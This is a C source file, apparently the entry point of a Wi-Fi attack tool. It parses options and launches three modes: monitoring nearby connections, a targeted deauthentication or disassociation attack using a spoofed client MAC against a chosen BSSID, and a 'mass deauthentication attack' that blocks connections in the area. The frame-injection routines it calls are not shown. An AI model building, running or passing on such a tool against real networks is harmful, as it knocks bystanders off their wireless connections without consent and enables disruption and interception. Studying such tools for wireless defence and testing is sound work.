#include "airconf.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include "air_pollution.h"
#include "air_control.h"
#include "air_support.h"
#include "housekeeping.h"
#include "main.h"


/* Operation modes */
#define AIR_SPY  1
#define AIR_BULLY 2
#define AIR_FLOOD 3

/* Definition of shared global variables */
int termflag = 0;
pcap_t *main_devhandle = NULL;
int status = EXIT_SUCCESS;


/* Helper macro for signal setup */
#define sig_establish(s, s_ops, old_op) \
do { \
      if (sigaction((s), &(s_ops), (old_op)) == -1) { \
         perror("Failed to setup signal handler"); \
         exit(EXIT_FAILURE); \
      } \
   } while(0)
   


int main(int argc, char *argv[]) {

  char *spoofed_mac = NULL, *bssid = NULL;
  int option, mode = 0;
  struct airloop_params air_data = { NULL, NULL, NULL, NULL, MAX_CON_DEFAULT };

  opterr = 0;

  while ((option = getopt(argc, argv, ":hfmdpai:s:b:c:")) != -1) {

        switch(option) {

            case 'h':
	    usage();
	    break;
	    

	    case 'm':
	    mode = AIR_SPY;
	    break;


	    case 'd':
	    mode = AIR_BULLY;
	    break;

            
	    case 'f':
	    mode = AIR_FLOOD;
	    break;
            

            case 'i':
            air_data.wifi_dev_name = optarg;
	    break;

            
	    case 's':
            spoofed_mac = optarg;
	    break;

            
	    case 'b':
	    bssid = optarg;
	    break;


	    case 'c':
	    air_data.max_contrack = atoi(optarg);
	    break;


	    case 'p':
	    air_data.cmd_opts |= PASSIVE_SCAN;
	    break;   


            case 'a':
	    air_data.cmd_opts |= DISASSOCIATION_REQ;
	    break;


	    case '?':
            puts("Invalid option.");
	    exit(EXIT_FAILURE);
	    break;

	    
	    case ':':
	    puts("Missing option argument.");
	    exit(EXIT_FAILURE);
	    break;


	    default:
	    puts("Invalid input.");
	    exit(EXIT_FAILURE);
	    break;

	}


  }


  if (mode != 0 && getuid() != 0) 
      puts("Warning, you may lack sufficient privileges...");

  if (mode == AIR_SPY || mode == AIR_FLOOD) {
     
     pthread_t sig_handler_thr;
     struct signal_thr_opts sig_opts;
     pthread_mutex_t term_mx = PTHREAD_MUTEX_INITIALIZER;    
     pthread_mutex_t pcap_mx = PTHREAD_MUTEX_INITIALIZER;

     sig_opts.term_mx = &term_mx;
     air_data.term_mx = &term_mx;

     
     /*  It would seem like the pcap_activate() function writes
      *  to a static variable to track state. Because of this
      *  we need a mutex to prevent a race during initialization.
      */
     air_data.pcap_mx = &pcap_mx;


     thr_sighandler_setup(&sig_handler_thr, &sig_opts);
     capture_session_setup(&air_data);

        
     switch(mode) {

           case AIR_SPY:
	   printf("Monitoring active connections (max %d) in area:\n\n", air_data.max_contrack);
           pcap_loop(main_devhandle, 0, air_watch, (u_char *) &air_data);  
	   break;


	   case AIR_FLOOD:
	   printf("Starting mass deauthentication attack...\nBlocked connections (max %d):\n\n", air_data.max_contrack);
           pcap_loop(main_devhandle, 0, air_freeze, (u_char *) &air_data);
    
           struct frame_thrower *polluter = air_data.attackers;
      
           while (polluter != NULL) {
            
                 pthread_cancel(polluter->thr_id);    
		 pthread_join(polluter->thr_id, NULL);

                 polluter = polluter->next;
            
           }
      
           free_list(&air_data.attackers, THR_ID);
	   break;

     }


     pthread_cancel(sig_handler_thr);
     pthread_join(sig_handler_thr, NULL);

     capture_session_cleanup(&air_data);
     pthread_mutex_destroy(&term_mx);
     pthread_mutex_destroy(&pcap_mx);

     exit(status);

  }
  
  else if (mode == AIR_BULLY) {

       struct sigaction sig_ops; 
       sig_ops.sa_handler = std_sighandler;
       sig_ops.sa_flags = SA_RESTART;
       sigemptyset(&sig_ops.sa_mask);


       if (air_data.wifi_dev_name == NULL)
          bail_out("Wireless card must be specified");

       if (spoofed_mac == NULL || bssid == NULL)
          bail_out("You must specify two mac addresses");


       u_char *conv_client = check_malloc(ETH_ALEN);
       u_char *conv_bssid = check_malloc(ETH_ALEN);
        
       errno = 0;
       
       iw_mac_aton(spoofed_mac, conv_client, ETH_ALEN);  
       iw_mac_aton(bssid, conv_bssid, ETH_ALEN);
 
       if (errno != 0) 
          perror_exit("Invalid MAC addresses");
       
       sig_establish(SIGTERM, sig_ops, NULL);
       sig_establish(SIGINT, sig_ops, NULL);    
       sig_establish(SIGABRT, sig_ops, NULL);
        
       frame_inject(air_data.wifi_dev_name, conv_client, conv_bssid, air_data.cmd_opts);    
 
       free(conv_client);
       free(conv_bssid);
        
       exit(status);    
 
  }

  else
      usage();      
              
}
